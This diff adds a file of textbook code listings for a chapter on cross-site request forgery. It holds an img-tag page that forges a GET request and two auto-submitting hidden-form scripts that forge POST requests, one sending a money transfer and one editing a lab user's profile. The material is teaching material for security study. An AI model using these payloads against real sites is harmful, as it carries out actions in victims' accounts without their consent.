@@ -1,0 +1,73 @@
+/******************************
+ * Code in Chapter 9
+ ******************************/
+
+
+/**********************************************
+ * HTML Code on Page 159 (Section 9.3.3)
+ **********************************************/
+
+<html>
+<body>
+  <h1>This page forges an HTTP GET request.</h1>
+
+  <img src="http://www.csrflabelgg.com/action/friends/add?friend=42" 
+       alt="image" width="1" height="1" />
+</body>
+</html>
+
+
+/**********************************************
+ * Javascript Code on Page 160 (Section 9.4.1)
+ **********************************************/
+
+<script type="text/javascript">
+function forge_post()
+{
+
+   var fields;
+   fields += "<input type='hidden' name='to' value='3220'>"; 
+   fields += "<input type='hidden' name='amount' value='500'>";
+
+   var p = document.createElement("form");                   
+   p.action = "http://www.example.com/action_post.php";
+   p.innerHTML = fields;                                      
+   p.method = "post";                                         
+   document.body.appendChild(p);                            
+   p.submit();                                             
+}
+
+window.onload = function() { forge_post();}               
+</script>
+
+
+/**********************************************
+ * HTML Code on Page 162 (Section 9.4.2)
+ **********************************************/
+<html><body>
+<h1>This page forges an HTTP POST request.</h1>
+<script type="text/javascript">
+function forge_post()
+{
+  var fields;
+
+  fields = "<input type='hidden' name='name' value='Alice'>";
+  fields += "<input type='hidden' name='description'
+                                  value='SAMY is MY HERO'>";
+  fields += "<input type='hidden' name='accesslevel[description]' 
+                                  value='2'>";
+  fields += "<input type='hidden' name='guid' value='39'>";
+
+  var p = document.createElement("form");  
+  p.action = "http://www.csrflabelgg.com/action/profile/edit";
+  p.innerHTML = fields;
+  p.method = "post";  
+  document.body.appendChild(p); 
+  p.submit();
+}
+
+window.onload = function() { forge_post();}
+</script>
+</body>
+</html>
+
